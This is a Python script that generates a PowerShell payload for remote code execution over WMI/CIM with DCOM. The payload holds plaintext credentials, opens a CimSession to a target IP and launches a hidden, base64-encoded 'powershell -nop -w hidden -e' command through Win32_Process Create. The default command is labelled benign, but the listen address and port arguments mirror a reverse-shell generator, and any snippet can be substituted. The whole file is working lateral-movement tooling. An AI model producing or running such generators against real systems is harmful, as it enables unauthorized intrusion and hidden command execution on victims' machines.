#!/usr/bin/python3
import argparse
import base64
from textwrap import dedent

POSTAMBLE = (
    "Invoke-CimMethod -CimSession $Session -ClassName Win32_Process "
    "-MethodName Create -Arguments @{CommandLine =$Command};"
)

def encode_ps_for_e(powershell_snippet: str) -> str:
    """
    Encode a PowerShell snippet in UTF-16LE Base64 for use with `powershell -e`.
    """
    return base64.b64encode(powershell_snippet.encode("utf-16le")).decode()

def main():
    parser = argparse.ArgumentParser(
        description="Print a PowerShell wrapper with $Command holding a base64-encoded benign snippet."
    )
    parser.add_argument("-username", required=True, help="Username for PSCredential")
    parser.add_argument("-password", required=True, help="Password for PSCredential")
    parser.add_argument("-target_ip", required=True, help="Target IP for CimSession")

    parser.add_argument(
        "-listen_address",
        help="Address for benign demo output",
        default="127.0.0.1",
    )
    parser.add_argument(
        "-listen_port",
        type=int,
        help="Port for benign demo output",
        default=443,
    )
    parser.add_argument(
        "--snippet",
        help='Benign PowerShell snippet to run (default: "Write-Host" + Get-Date).',
        default=None,
    )

    args = parser.parse_args()

    # Build PREAMBLE dynamically from args
    preamble = dedent(f"""\
    $username = '{args.username}';
    $password = '{args.password}';
    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

    $Options = New-CimSessionOption -Protocol DCOM
    $Session = New-Cimsession -ComputerName {args.target_ip} -Credential $credential -SessionOption $Options
    """)

    # Provide a harmless default snippet if none is supplied
    ps_snippet = (
        args.snippet
        if args.snippet is not None
        else f'Write-Host "Hello from {args.listen_address}:{args.listen_port}"; Get-Date'
    )

    encoded = encode_ps_for_e(ps_snippet)
    command_line = "powershell -nop -w hidden -e " + encoded

    # Print exactly in the order requested
    print(preamble, end="" if preamble.endswith("\n") else "\n")
    print(f"$Command = '{command_line}';\n")
    print(POSTAMBLE)

if __name__ == "__main__":
    main()
